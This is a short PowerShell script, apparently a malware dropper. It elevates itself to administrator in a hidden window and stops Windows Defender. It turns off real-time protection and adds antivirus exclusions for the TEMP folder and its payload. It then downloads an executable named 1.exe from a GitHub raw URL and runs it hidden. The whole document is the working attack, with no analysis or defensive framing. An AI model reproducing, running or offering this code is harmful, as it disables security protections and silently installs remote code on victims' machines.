if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    Exit
}
Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
$exePath = "$env:TEMP\1.exe"
$url = "https://github.com/socialhate/Test/raw/refs/heads/main/1.exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$webclient = New-Object Net.WebClient
$webclient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$webclient.DownloadFile($url, $exePath)
Unblock-File -Path $exePath -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "$env:TEMP" -Force -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $exePath -Force -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "1.exe" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2
Start-Process -FilePath $exePath -WindowStyle Hidden

Exit
